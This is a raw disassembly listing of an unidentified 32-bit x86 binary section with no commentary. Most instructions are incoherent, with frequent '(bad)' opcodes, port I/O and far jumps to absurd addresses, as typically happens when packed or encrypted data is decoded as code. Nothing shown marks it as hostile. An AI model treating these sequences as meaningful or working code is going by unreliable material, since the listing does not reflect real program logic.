  40ad51:	adc    BYTE PTR [ebp-0x6511fc86],dl
  40ad57:	add    BYTE PTR [ebx],0x50
  40ad5a:	loope  0x40adb6
  40ad5c:	pushf  
  40ad5d:	or     eax,DWORD PTR [esi-0x18]
  40ad60:	cdq    
  40ad61:	mov    cl,0x8a
  40ad63:	sub    al,0x2
  40ad65:	pop    ss
  40ad66:	stos   DWORD PTR es:[edi],eax
  40ad67:	and    eax,0x9e142467
  40ad6c:	cdq    
  40ad6d:	arpl   WORD PTR [ecx-0x7b45445e],di
  40ad73:	jge    0x40adb4
  40ad75:	scas   eax,DWORD PTR es:[edi]
  40ad76:	call   0x23f876f2
  40ad7b:	xchg   BYTE PTR [eax],al
  40ad7d:	mov    eax,ds:0x80fefc56
  40ad82:	dec    eax
  40ad83:	cdq    
  40ad84:	pop    ebx
  40ad85:	out    dx,eax
  40ad86:	adc    DWORD PTR [edx-0x14d0c587],edx
  40ad8c:	outs   dx,BYTE PTR ds:[esi]
  40ad8d:	ret    
  40ad8e:	loopne 0x40ade1
  40ad90:	push   esp
  40ad91:	dec    ecx
  40ad92:	and    bl,al
  40ad94:	xor    DWORD PTR [eax+0x39],0xffffff9b
  40ad98:	or     ebx,ecx
  40ad9a:	mov    al,ds:0x2a7cb91a
  40ad9f:	ja     0x40adc2
  40ada1:	dec    esp
  40ada2:	(bad)  
  40ada3:	and    eax,0xfa51b4fd
  40ada8:	cwde   
  40ada9:	cld    
  40adaa:	xchg   ebp,eax
  40adab:	xlat   BYTE PTR ds:[ebx]
  40adac:	sbb    DWORD PTR [eax],0xe86ac10
  40adb2:	or     bh,ch
  40adb4:	imul   ebx,DWORD PTR [edx],0xffffff82
  40adb7:	dec    esi
  40adb8:	and    ebp,DWORD PTR [eax+0x261c3f4c]
  40adbe:	out    dx,al
  40adbf:	jp     0x40ae2c
  40adc1:	add    ah,BYTE PTR [ebx-0x71]
  40adc4:	push   es
  40adc5:	sbb    ebp,DWORD PTR [ecx-0x4b94698f]
  40adcb:	xchg   esi,eax
  40adcc:	es loopne 0x40adc0
  40adcf:	xor    edx,DWORD PTR [esi+eax*1-0x427fe0fd]
  40add6:	fdiv   DWORD PTR [esp+edx*2]
  40add9:	cmp    dl,BYTE PTR [ebx-0x54]
  40addc:	cwde   
  40addd:	add    al,0xce
  40addf:	es jge 0x40ae53
  40ade2:	fstp   QWORD PTR [edx-0x17]
  40ade5:	sbb    DWORD PTR [edx],edi
  40ade7:	into   
  40ade8:	in     eax,dx
  40ade9:	push   es
  40adea:	mov    dl,BYTE PTR ds:0xfcb573a3
  40adf0:	xor    bl,al
  40adf2:	pop    eax
  40adf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adf4:	sub    dh,al
  40adf6:	call   0x2ae87079
  40adfb:	daa    
  40adfc:	rcr    eax,1
  40adfe:	cwde   
  40adff:	inc    BYTE PTR [ebx]
  40ae01:	or     al,0x87
  40ae03:	and    DWORD PTR [ecx+0x5cff08f3],esi
  40ae09:	in     al,dx
  40ae0a:	mov    al,BYTE PTR [ecx+edx*2]
  40ae0d:	lahf   
  40ae0e:	aas    
  40ae0f:	imul   edi,eax,0xffffffbd
  40ae12:	das    
  40ae13:	in     al,dx
  40ae14:	mov    dh,0xa4
  40ae16:	and    DWORD PTR [esi],ebp
  40ae18:	aad    0xd8
  40ae1a:	and    eax,0x2cf4bc10
  40ae1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae20:	add    edx,0xc977d15e
  40ae26:	pusha  
  40ae27:	mov    esp,0x2dc5399a
  40ae2c:	shr    dh,1
  40ae2e:	fist   DWORD PTR gs:[ebx+0x5a6cbbee]
  40ae35:	in     eax,0xff
  40ae37:	add    al,0xf3
  40ae39:	test   DWORD PTR [esi-0x4],edi
  40ae3c:	fs dec ebx
  40ae3e:	gs inc edi
  40ae40:	xchg   ebp,eax
  40ae41:	and    BYTE PTR [esi+0x38],0x7e
  40ae45:	imul   esi,edi,0xc495233a
  40ae4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4c:	cmp    al,0x7e
  40ae4e:	mov    edx,0x595b298a
  40ae53:	and    eax,0x306973ff
  40ae58:	fnstsw WORD PTR ds:[ebx+0x13]
  40ae5c:	and    BYTE PTR [edx-0x1e],0x8e
  40ae60:	stc    
  40ae61:	jns    0x40adef
  40ae63:	mov    edi,0x411ffbf7
  40ae68:	mov    ebp,DWORD PTR [eax+0x2e5c0aa8]
  40ae6e:	(bad)  
  40ae6f:	out    dx,al
  40ae70:	cmp    dl,al
  40ae72:	sub    BYTE PTR [esi-0x19],ch
  40ae75:	mov    esp,0xb4f39db7
  40ae7a:	add    dl,ch
  40ae7c:	out    0x16,al
  40ae7e:	outs   dx,DWORD PTR ds:[esi]
  40ae7f:	sub    al,0x27
  40ae81:	retf   
  40ae82:	out    dx,al
  40ae83:	adc    cl,dl
  40ae85:	mov    WORD PTR [ebx+0x7a],gs
  40ae88:	add    bl,0xa0
  40ae8b:	out    dx,eax
  40ae8c:	pop    eax
  40ae8d:	jns    0x40aed0
  40ae8f:	mov    bl,0x51
  40ae91:	repz xchg esp,eax
  40ae93:	rol    DWORD PTR [esi+eax*4-0x6b590b6d],0x5c
  40ae9b:	jle    0x40aee2
  40ae9d:	rol    al,cl
  40ae9f:	mov    dl,0x7
  40aea1:	cmc    
  40aea2:	mov    al,0x89
  40aea4:	jnp    0x40af22
  40aea6:	stos   BYTE PTR es:[edi],al
  40aea7:	dec    ecx
  40aea8:	or     edx,ecx
  40aeaa:	loopne 0x40aeab
  40aeac:	push   esp
  40aead:	clc    
  40aeae:	test   al,0xe5
  40aeb0:	in     al,dx
  40aeb1:	stos   DWORD PTR es:[edi],eax
  40aeb2:	out    0xf1,eax
  40aeb4:	fs (bad) 
  40aeb6:	xchg   edx,eax
  40aeb7:	pop    edi
  40aeb8:	popa   
  40aeb9:	pop    ds
  40aeba:	cmp    edx,DWORD PTR [edx-0x2e]
  40aebd:	sbb    BYTE PTR [esi+ebp*2-0x4b],0x41
  40aec2:	ja     0x40ae4c
  40aec4:	jle    0x40af2e
  40aec6:	ins    BYTE PTR es:[edi],dx
  40aec7:	pop    eax
  40aec8:	int3   
  40aec9:	ds mov al,0xd
  40aecc:	ins    DWORD PTR es:[edi],dx
  40aecd:	(bad)  
  40aecf:	cli    
  40aed0:	pop    eax
  40aed1:	mov    ds:0x4e1142de,al
  40aed6:	and    al,0xd3
  40aed8:	cmp    ah,BYTE PTR [edi+0x797c5815]
  40aede:	and    DWORD PTR [edx-0x703ce0d],esp
  40aee4:	add    DWORD PTR [eax],esp
  40aee6:	xlat   BYTE PTR ds:[ebx]
  40aee7:	mov    DWORD PTR [esi+edi*1],esp
  40aeea:	loope  0x40aed6
  40aeec:	jecxz  0x40ae7d
  40aeee:	jbe    0x40aea7
  40aef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef1:	mov    ds,WORD PTR [ebp-0x17]
  40aef4:	iret   
  40aef5:	add    BYTE PTR [edi-0x4],dh
  40aef8:	jb     0x40aef8
  40aefa:	push   ecx
  40aefb:	jnp    0x40af66
  40aefd:	push   ebx
  40aefe:	ret    0xa21c
  40af01:	and    BYTE PTR [edx-0x4887b017],al
  40af07:	pushf  
  40af08:	push   eax
  40af09:	cmc    
  40af0a:	lods   al,BYTE PTR ds:[esi]
  40af0b:	cmc    
  40af0c:	mov    bh,0x62
  40af0e:	cmp    BYTE PTR [ecx-0x1f],dh
  40af11:	dec    ebp
  40af12:	mov    al,0xc
  40af14:	jne    0x40aecb
  40af16:	(bad)  
  40af17:	shl    al,cl
  40af19:	jmp    0x40aee8
  40af1b:	lahf   
  40af1c:	pusha  
  40af1d:	scas   al,BYTE PTR es:[edi]
  40af1e:	xor    al,0xa
  40af20:	sbb    DWORD PTR [eax],edx
  40af22:	sub    dl,BYTE PTR [ebp+0x41]
  40af25:	pop    ss
  40af26:	pop    eax
  40af27:	js     0x40af6f
  40af29:	adc    DWORD PTR [edi+0x2c],eax
  40af2c:	rcl    BYTE PTR [ebx-0x732f895c],cl
  40af32:	pop    edi
  40af33:	dec    esi
  40af34:	adc    eax,0xb7b14e78
  40af39:	or     eax,0x1520946e
  40af3e:	mov    bl,BYTE PTR [edx-0x6]
  40af41:	adc    al,0x5c
  40af43:	push   edx
  40af44:	std    
  40af45:	stos   BYTE PTR es:[edi],al
  40af46:	pop    es
  40af47:	pop    ebx
  40af49:	fs push esp
  40af4b:	jge    0x40aedf
  40af4d:	sub    ch,BYTE PTR [ebx-0x71]
  40af50:	add    DWORD PTR [esi+0x671af0bb],ebx
  40af56:	outs   dx,BYTE PTR ds:[esi]
  40af57:	xor    BYTE PTR ds:0x1610388a,al
  40af5d:	loop   0x40afc4
  40af5f:	cli    
  40af60:	push   cs
  40af61:	push   ds
  40af62:	cmp    eax,0x494367a3
  40af67:	out    dx,al
  40af68:	fld    st(3)
  40af6a:	mov    cl,0x64
  40af6c:	xchg   edx,eax
  40af6d:	in     al,dx
  40af6e:	jg     0x40af4f
  40af70:	sbb    BYTE PTR [edi-0x76],cl
  40af73:	test   DWORD PTR [esp+ecx*8],0xe85b458a
  40af7a:	inc    edx
  40af7b:	xchg   BYTE PTR [edi-0x48],ch
  40af7e:	inc    esp
  40af7f:	nop
  40af80:	jo     0x40af5d
  40af82:	and    bh,BYTE PTR [esi]
  40af84:	scas   al,BYTE PTR es:[edi]
  40af85:	jg     0x40afd8
  40af87:	inc    edx
  40af88:	mov    edx,DWORD PTR [ebx]
  40af8a:	jg     0x40af61
  40af8c:	rcr    BYTE PTR [edi+ecx*1+0xc53d35a],0xf0
  40af94:	lahf   
  40af95:	pushf  
  40af96:	dec    edi
  40af97:	fstp   QWORD PTR [ecx+0x330f1cca]
  40af9d:	mov    ds:0xf2bd3afd,eax
  40afa2:	jp     0x40af24
  40afa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa5:	adc    al,0xcf
  40afa7:	xchg   DWORD PTR [eax+0x7b],edi
  40afaa:	add    al,0x60
  40afac:	in     eax,0xcb
  40afae:	stc    
  40afaf:	xor    esp,ecx
  40afb1:	(bad)
  40afb5:	scas   al,BYTE PTR es:[edi]
  40afb6:	cmp    ah,ah
  40afb8:	repnz loope 0x40af88
  40afbb:	add    ah,BYTE PTR [ebx+0x49]
  40afbe:	push   bx
  40afc0:	mov    bl,0x5d
  40afc2:	jbe    0x40afe6
  40afc4:	test   DWORD PTR [ebx+ebx*8-0x572413ef],esi
  40afcb:	xor    eax,0xfeea1b36
  40afd0:	mov    cl,0x45
  40afd2:	jmp    0xb52d:0x9bfa5aae
  40afd9:	jmp    0x40afa2
  40afdb:	mov    ebx,0xdde937e
  40afe0:	cmp    dh,dl
  40afe2:	adc    ch,0xed
  40afe5:	push   0x12
  40afe7:	add    eax,0x80da4a2e
  40afec:	inc    ecx
  40afed:	or     esp,DWORD PTR [eax]
  40afef:	jg     0x40aff8
  40aff1:	shufps xmm2,xmm2,0xe0
  40aff5:	outs   dx,DWORD PTR ds:[esi]
  40aff6:	mov    bl,0x78
  40aff8:	pop    si
  40affa:	or     esp,DWORD PTR [edx]
  40affc:	adc    eax,0x51c34067
  40b001:	pop    edx
  40b002:	call   0xd387:0xfea0fb90
  40b009:	xor    BYTE PTR ds:0x691cc065,dh
  40b00f:	cmc    
  40b010:	dec    ecx
  40b011:	jne    0x40afa7
  40b013:	dec    esi
  40b014:	sub    ecx,eax
  40b016:	xchg   esp,ebx
  40b018:	adc    eax,0x8eedfa16
  40b01d:	fwait
  40b01e:	retf   0xd999
  40b021:	pusha  
  40b022:	sub    DWORD PTR ds:0x8aea5063,edi
  40b028:	push   ecx
  40b029:	jae    0x40b055
  40b02b:	mov    BYTE PTR [ebp+0x23195173],ch
  40b031:	or     ah,BYTE PTR [ebx-0x276a0e35]
  40b037:	popa   
  40b038:	adc    al,BYTE PTR [esi+0x7f]
  40b03b:	jb     0x40afd8
  40b03d:	mov    ds,WORD PTR [edx+0x5c]
  40b040:	dec    ecx
  40b041:	adc    cl,BYTE PTR ds:0x97cf0b7b
  40b047:	daa    
  40b048:	lods   eax,DWORD PTR ds:[esi]
  40b049:	cld    
  40b04a:	push   ebx
  40b04b:	in     eax,dx
  40b04c:	push   eax
  40b04d:	jne    0x40afe5
  40b04f:	bound  eax,QWORD PTR [edi+ebx*2-0x35]
  40b053:	(bad)  
  40b054:	iret   
  40b055:	jp     0x40b060
  40b057:	imul   DWORD PTR [esi]
  40b059:	sub    DWORD PTR [ebx],edi
  40b05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b05c:	mov    ecx,0xf09329bc
  40b061:	and    al,dl
  40b063:	imul   ebx,DWORD PTR cs:[eax+0x73],0xffffffb6
  40b068:	pop    edi
  40b069:	mov    ds:0xfa6ca4bd,eax
  40b06e:	js     0x40b01a
  40b070:	mov    ds:0xcdae5e9f,al
  40b075:	mov    dl,0x30
  40b077:	pop    edi
  40b078:	or     BYTE PTR [esi],0x8e
  40b07b:	or     edi,DWORD PTR [ecx-0x4b]
  40b07e:	pop    edi
  40b07f:	out    dx,eax
  40b080:	sub    ebp,DWORD PTR [esi-0x1]
  40b083:	sub    eax,0x127ab670
  40b088:	mov    DWORD PTR [esi+0x7f016237],edx
  40b08e:	jge    0x40b02b
  40b090:	loop   0x40b032
  40b092:	test   al,0x73
  40b094:	jl     0x40b01e
  40b096:	stos   DWORD PTR es:[edi],eax
  40b097:	leave  
  40b098:	shr    DWORD PTR [edx],cl
  40b09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b09b:	cdq    
  40b09c:	mov    edx,0xf6f0e37b
  40b0a1:	push   ss
  40b0a2:	push   esi
  40b0a3:	jb     0x40b120
  40b0a5:	adc    BYTE PTR [ecx+eax*4+0x61],dl
  40b0a9:	dec    ecx
  40b0aa:	or     edi,DWORD PTR ds:0x1de50ccb
  40b0b0:	retf   
  40b0b1:	jge    0x40b0aa
  40b0b3:	and    dl,BYTE PTR [edi-0x8c817e2]
  40b0b9:	inc    esi
  40b0ba:	xchg   edi,eax
  40b0bb:	call   0x119fb7a3
  40b0c0:	in     al,0x69
  40b0c2:	mov    eax,ds:0x8a14cf0f
  40b0c7:	add    edx,DWORD PTR [ebp-0x572bf13d]
  40b0cd:	adc    eax,0x51cd2cb9
  40b0d2:	repz test DWORD PTR ss:[eax-0x24],edx
  40b0d7:	fisttp DWORD PTR [eax+0x784e9c02]
  40b0dd:	dec    edi
  40b0de:	push   eax
  40b0df:	mov    eax,DWORD PTR cs:[ebp-0x28]
  40b0e3:	xor    eax,esi
  40b0e5:	add    eax,edi
  40b0e7:	mov    DWORD PTR [ebp-0x20],eax
  40b0ea:	mov    eax,DWORD PTR [ebp-0x4]
  40b0ed:	mov    DWORD PTR [ebp-0x24],eax
  40b0f0:	lea    eax,[ebp-0x98]
  40b0f6:	mov    DWORD PTR [ebp-0x8],eax
  40b0f9:	jmp    0x40b604
  40b0fe:	(bad)  
  40b0ff:	(bad)  
  40b100:	retf   0xcad1
  40b103:	rcl    ebp,1
  40b105:	fnstcw WORD PTR [ebx-0x31]
  40b108:	stc    
  40b109:	mov    ds:0xb9c5ebcc,eax
  40b10e:	dec    esi
  40b10f:	nop
  40b110:	js     0x40b18a
  40b112:	push   0x7c
  40b114:	js     0x40b18e
  40b116:	push   eax
  40b117:	enter  0x3e9e,0x13
  40b11b:	je     0x40b148
  40b11d:	xlat   BYTE PTR ds:[ebx]
  40b11e:	or     BYTE PTR [edi+0xe],bl
  40b121:	ds nop
  40b123:	addps  xmm7,xmm0
  40b126:	pusha  
  40b127:	inc    ecx
  40b128:	stos   DWORD PTR es:[edi],eax
  40b129:	addr16 call 0x73d6:0x41847899
  40b131:	or     al,0x8d
  40b134:	int    0x90
  40b136:	scas   eax,DWORD PTR es:[edi]
  40b137:	es xchg esp,eax
  40b139:	mov    esp,0x7ae0dfe8
  40b13e:	mov    ebp,0x5e1ac768
  40b143:	inc    ebp
  40b144:	push   ds
  40b145:	jns    0x40b1ba
  40b147:	loopne 0x40b0d0
  40b149:	or     DWORD PTR [ebx+ecx*2],edx
  40b14c:	fild   WORD PTR [eax]
  40b14e:	clc    
  40b14f:	popa   
  40b150:	jbe    0x40b1c2
  40b152:	mov    al,BYTE PTR [edi-0x1b]
  40b155:	mov    ds:0x20bfa023,eax
  40b15a:	jl     0x40b153
  40b15c:	or     dh,BYTE PTR [edi]
  40b15e:	mov    ah,0xcb
  40b160:	(bad)  
  40b161:	scas   al,BYTE PTR es:[edi]
  40b162:	dec    esp
  40b163:	test   al,0xf5
  40b165:	xchg   esi,esi
  40b167:	or     edi,DWORD PTR [ebp-0x38a7ebd5]
  40b16d:	mov    dh,0xe7
  40b16f:	inc    esp
  40b170:	daa    
  40b171:	push   0x14382940
  40b176:	push   ss
  40b177:	jns    0x40b1bf
  40b179:	mov    dh,bh
  40b17b:	xchg   edi,eax
  40b17c:	fisub  DWORD PTR [ecx-0x5c1a6c71]
  40b182:	in     eax,0x64
  40b184:	add    eax,0x6fc29d6c
  40b189:	push   ds
  40b18a:	dec    ebx
  40b18b:	dec    edx
  40b18c:	pop    esp
  40b18d:	xchg   edi,eax
  40b18e:	xlat   BYTE PTR ds:[ebx]
  40b18f:	mov    ds:0xac023c5f,al
  40b194:	inc    edi
  40b195:	fucom  st(7)
  40b197:	lea    esp,[ecx]
  40b199:	add    ch,BYTE PTR ss:[ebx-0x2b]
  40b19d:	mov    bl,0xf2
  40b19f:	inc    BYTE PTR [esp+ebx*8-0x4dfac91a]
  40b1a6:	xchg   ebp,eax
  40b1a7:	inc    ebp
  40b1a8:	mov    eax,ds:0x1719656f
  40b1ad:	and    al,0xce
  40b1af:	fwait
  40b1b0:	pop    es
  40b1b1:	jmp    0xec1503e5
  40b1b6:	dec    esp
  40b1b7:	lods   eax,DWORD PTR ds:[esi]
  40b1b8:	(bad)  
  40b1ba:	sbb    ecx,ecx
  40b1bc:	cmp    al,0x18
  40b1be:	mov    ch,BYTE PTR [esi]
  40b1c0:	neg    BYTE PTR [ebp+0x5e83df02]
  40b1c6:	sbb    dl,bh
  40b1c8:	pop    eax
  40b1c9:	mov    edx,0x69fe08ad
  40b1ce:	aas    
  40b1cf:	mov    esp,0x26695bbd
  40b1d4:	or     al,0xb
  40b1d6:	(bad)  
  40b1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d8:	add    al,0x8e
  40b1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1db:	mov    edx,DWORD PTR [edx+0x335e7f0a]
  40b1e1:	imul   ecx,ecx,0x44061f91
  40b1e7:	jmp    0xe18dc029
  40b1ec:	cwde   
  40b1ed:	ret    
  40b1ee:	icebp  
  40b1ef:	sar    BYTE PTR [edx+0x5f829340],1
  40b1f5:	xor    eax,0x3f5df3ac
  40b1fa:	dec    ecx
  40b1fb:	and    BYTE PTR [ecx+0x4],bl
  40b1fe:	loop   0x40b236
  40b200:	mov    eax,eax
  40b202:	cmp    eax,0x97a72ed
  40b207:	cdq    
  40b208:	add    ebx,DWORD PTR [esi-0x57]
  40b20b:	inc    ebx
  40b20c:	inc    esi
  40b20d:	cmp    ah,BYTE PTR [edx-0x2]
  40b210:	push   ecx
  40b211:	sub    DWORD PTR [esi+0x4c],eax
  40b214:	shl    ebp,1
  40b216:	stc    
  40b217:	dec    esp
  40b218:	popa   
  40b219:	dec    edi
  40b21a:	fwait
  40b21b:	loop   0x40b295
  40b21d:	add    eax,DWORD PTR [edx+0x36]
  40b220:	mov    esp,0x19d913d7
  40b225:	xor    dh,BYTE PTR [edx-0x63]
  40b228:	xor    BYTE PTR [edi],dl
  40b22a:	cs dec esp
  40b22c:	imul   esi,DWORD PTR [esi-0x2e],0x64
  40b230:	xchg   edi,eax
  40b231:	cwde   
  40b232:	and    eax,0x5f340bba
  40b237:	push   ss
  40b238:	cwde   
  40b239:	js     0x40b1eb
  40b23b:	dec    ebx
  40b23c:	pop    ss
  40b23d:	out    dx,eax
  40b23e:	add    edi,DWORD PTR [edx-0x7e]
  40b241:	mov    dh,0x7d
  40b243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b244:	jb     0x40b1e3
  40b246:	cwde   
  40b247:	jne    0x40b1cb
  40b249:	jl     0x40b20a
  40b24b:	adc    bl,ah
  40b24d:	test   BYTE PTR [edx+0x19246476],bl
  40b253:	push   ebx
  40b254:	lods   al,BYTE PTR ds:[esi]
  40b255:	add    bl,ah
  40b257:	adc    DWORD PTR [ebx+0x43a00101],ebp
  40b25d:	xchg   ebx,eax
  40b25e:	mov    bh,0xd2
  40b260:	push   eax
  40b261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b262:	call   0x1f3d38b5
  40b267:	sub    BYTE PTR ds:0x4b3ce3ac,0x91
  40b26e:	mov    dh,0xfa
  40b270:	idiv   BYTE PTR [edx+0x22]
  40b273:	and    ch,ah
  40b275:	xor    ah,BYTE PTR [edx+0x6b00d082]
  40b27b:	add    bl,0xfc
  40b27e:	push   ebx
  40b27f:	cmp    al,0x57
  40b281:	jb     0x40b2da
  40b283:	repnz ss (bad) 
  40b286:	imul   edi,DWORD PTR ds:0xe7dd7e63,0x5e
  40b28d:	add    al,0x6f
  40b28f:	cmp    al,0x10
  40b291:	fisttp DWORD PTR [eax]
  40b293:	jns    0x40b267
  40b295:	dec    ebx
  40b296:	or     eax,0x4ca83e55
  40b29b:	mov    DWORD PTR [esi-0x22e1b0e2],esp
  40b2a1:	retf   0x8fba
  40b2a4:	cmp    al,0x77
  40b2a6:	push   ebx
  40b2a7:	add    ecx,edx
  40b2a9:	and    ecx,DWORD PTR [ecx]
  40b2ab:	rcr    al,1
  40b2ad:	(bad)  
  40b2ae:	(bad)  
  40b2af:	aam    0x94
  40b2b1:	repnz xchg ah,bl
  40b2b4:	pop    es
  40b2b5:	je     0x40b27e
  40b2b7:	dec    edx
  40b2b8:	std    
  40b2b9:	jmp    0x8d54d331
  40b2be:	jno    0x40b274
  40b2c0:	fidivr WORD PTR [eax+0x7fd73620]
  40b2c6:	mov    cl,0xbf
  40b2c8:	jns    0x40b2ab
  40b2ca:	sti    
  40b2cb:	(bad)  
  40b2cc:	int    0xfb
  40b2ce:	outs   dx,DWORD PTR ds:[esi]
  40b2cf:	out    dx,eax
  40b2d0:	nop
  40b2d1:	ins    DWORD PTR es:[edi],dx
  40b2d2:	adc    cl,BYTE PTR [esi]
  40b2d4:	dec    ecx
  40b2d5:	mov    bh,0x78
  40b2d7:	xor    eax,0x38e0490a
  40b2dc:	sbb    eax,0x3b21f8ed
  40b2e1:	clc    
  40b2e2:	sbb    ecx,eax
  40b2e4:	or     BYTE PTR [esi],0xa6
  40b2e7:	mov    edx,0x17aa80e0
  40b2ec:	nop    ebx
  40b2ef:	mov    WORD PTR [edx+0x32bd1633],ss
  40b2f5:	dec    eax
  40b2f6:	(bad)  
  40b2f7:	out    dx,al
  40b2f8:	mov    bh,0x92
  40b2fa:	add    DWORD PTR [ebp+ecx*1+0x3a47b891],0x3b41907e
  40b305:	or     ecx,DWORD PTR [ebp-0x5459b96f]
  40b30b:	pusha  
  40b30c:	retf   0x2c53
  40b30f:	cmp    DWORD PTR [esi],0xec8f0c7a
  40b315:	fld    TBYTE PTR ds:0x9257be64
  40b31b:	xchg   ebx,eax
  40b31c:	mov    bh,0x15
  40b31e:	mov    bl,0xac
  40b320:	push   es
  40b321:	push   es
  40b322:	mov    edi,0x62c0ca00
  40b327:	out    dx,eax
  40b328:	(bad)  
  40b329:	pop    ds
  40b32a:	or     BYTE PTR [esi],al
  40b32c:	inc    edi
  40b32d:	mov    esi,0x25d46dbe
  40b332:	cmp    DWORD PTR [ecx-0x2],edx
  40b335:	rol    ecx,cl
  40b337:	inc    edi
  40b338:	iret   
  40b339:	jl     0x40b369
  40b33b:	lds    eax,FWORD PTR [esp+ecx*2-0x2beb2236]
  40b342:	pop    edx
  40b343:	xchg   esi,eax
  40b344:	mov    edx,0x998f3b92
  40b349:	xor    BYTE PTR [edi+0x4e],0x20
  40b34d:	adc    DWORD PTR ds:0x6ae930,ebx
  40b353:	ret    
  40b354:	js     0x40b2e9
  40b356:	dec    esi
  40b357:	das    
  40b358:	call   0xa6af:0x784b91d4
  40b35f:	jp     0x40b395
  40b361:	lods   eax,DWORD PTR ds:[esi]
  40b362:	and    al,0xc7
  40b364:	lods   eax,DWORD PTR ds:[esi]
  40b365:	push   es
  40b366:	int    0xb4
  40b368:	test   DWORD PTR [ecx+0x74],ebp
  40b36b:	jl     0x40b396
  40b36d:	mov    bl,0x4f
  40b36f:	adc    esp,DWORD PTR [eax+edi*2]
  40b372:	mov    ebp,0xcdcd9a26
  40b377:	pushf  
  40b378:	xchg   BYTE PTR [ecx-0x6ae57335],bl
  40b37e:	(bad)  
  40b37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b380:	(bad)  [eax-0x14]
  40b383:	jbe    0x40b37e
  40b385:	mov    esi,0x4fc1a30f
  40b38a:	test   eax,0x8dda9807
  40b38f:	shr    DWORD PTR [edi+0x179275be],0x55
  40b396:	rol    DWORD PTR [ebp-0x6d],1
  40b399:	loope  0x40b37c
  40b39b:	mov    eax,ds:0xfadfde5c
  40b3a0:	sbb    BYTE PTR [eax+eiz*1],cl
  40b3a3:	xor    al,0xd5
  40b3a5:	scas   al,BYTE PTR es:[edi]
  40b3a6:	das    
  40b3a7:	das    
  40b3a8:	ins    BYTE PTR es:[edi],dx
  40b3a9:	mov    ds:0xf4c93333,al
  40b3ae:	mov    ch,0x81
  40b3b0:	mov    esi,DWORD PTR [edx+0x4f87b5a]
  40b3b6:	cli    
  40b3b7:	(bad)  
  40b3b8:	cmp    DWORD PTR [ebx+ecx*8-0x7e],esi
  40b3bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3bd:	push   ds
  40b3be:	xor    BYTE PTR [esi+0x79581f34],ch
  40b3c4:	addr16 rol ebx,cl
  40b3c7:	or     ch,BYTE PTR [esi]
  40b3c9:	ret    
  40b3ca:	adc    eax,0x5254f76c
  40b3cf:	dec    ebp
  40b3d0:	retf   
  40b3d1:	push   esp
  40b3d2:	cmp    al,0x7
  40b3d4:	ins    DWORD PTR es:[edi],dx
  40b3d5:	xchg   esi,eax
  40b3d6:	jnp    0x40b40c
  40b3d8:	pop    esp
  40b3d9:	xchg   BYTE PTR [bp+si],dh
  40b3dc:	push   esi
  40b3dd:	inc    edx
  40b3de:	in     al,0x2c
  40b3e0:	test   DWORD PTR [ebx*2-0x742a4aad],edi
  40b3e7:	push   esi
  40b3e8:	cld    
  40b3e9:	add    DWORD PTR [edx+0x48],0x2eb34433
  40b3f0:	dec    ecx
  40b3f1:	in     eax,dx
  40b3f2:	out    dx,al
  40b3f3:	repnz and bl,BYTE PTR [esi+0x6a]
  40b3f7:	dec    esi
  40b3f8:	loop   0x40b401
  40b3fa:	add    eax,0xd15fd75f
  40b3ff:	es cld 
  40b401:	arpl   WORD PTR [ebx],bp
  40b403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b404:	pushf  
  40b405:	pxor   mm7,mm1
  40b408:	sub    al,0xaf
  40b40a:	and    eax,0x2fb8b2d8
  40b40f:	jae    0x40b42c
  40b411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b413:	mov    eax,0x58d5e7f2
  40b418:	les    edi,FWORD PTR [edx-0x33]
  40b41b:	cld    
  40b41c:	rcl    DWORD PTR [ebx-0x30],cl
  40b41f:	stos   DWORD PTR es:[edi],eax
  40b420:	in     eax,dx
  40b421:	mov    DWORD PTR [bx+di+0x3c],eax
  40b425:	and    al,0x88
  40b427:	sub    ch,BYTE PTR [ecx]
  40b429:	ins    BYTE PTR es:[edi],dx
  40b42a:	mov    ch,0x8b
  40b42c:	sub    esp,DWORD PTR [ecx-0x6d]
  40b42f:	loope  0x40b3fb
  40b431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b432:	daa    
  40b433:	xor    ecx,eax
  40b435:	dec    ecx
  40b436:	mov    es,WORD PTR [edx+0x49]
  40b439:	mov    esp,0xcd0182db
  40b43e:	pop    es
  40b43f:	xchg   esi,eax
  40b440:	mov    cl,0xb
  40b442:	outs   dx,BYTE PTR ds:[esi]
  40b443:	push   edx
  40b444:	cmp    eax,0x3b770301
  40b449:	push   edi
  40b44a:	xchg   edi,eax
  40b44b:	ror    bl,1
  40b44d:	icebp  
  40b44e:	std    
  40b44f:	loopne 0x40b46b
  40b451:	cs aam 0xe7
  40b454:	repnz mov bl,0x8
  40b457:	mov    edi,0x825dc63d
  40b45c:	mov    bl,0x5b
  40b45e:	out    0x40,eax
  40b460:	mov    dl,0x72
  40b462:	sub    al,0xa1
  40b464:	or     eax,0x983fa942
  40b469:	sahf   
  40b46a:	les    ebp,FWORD PTR [ebp+0xfe54fe3]
  40b470:	mov    eax,es
  40b472:	iret   
  40b473:	repz mov ebx,0xdea29e9c
  40b479:	fwait
  40b47a:	jbe    0x40b47e
  40b47c:	call   0xbc700e8d
  40b481:	cmp    dh,BYTE PTR [eax+0x3d]
  40b484:	pop    ss
  40b485:	pop    esi
  40b486:	enter  0xe52e,0xe6
  40b48a:	js     0x40b495
  40b48c:	adc    eax,0x1046c6e1
  40b491:	ins    BYTE PTR es:[edi],dx
  40b492:	fisub  WORD PTR [ecx+0x6c8112b8]
  40b498:	inc    dh
  40b49a:	sub    ch,BYTE PTR es:[edx+0x4efb5f27]
  40b4a1:	stos   DWORD PTR es:[edi],eax
  40b4a2:	push   eax
  40b4a3:	lock inc edx
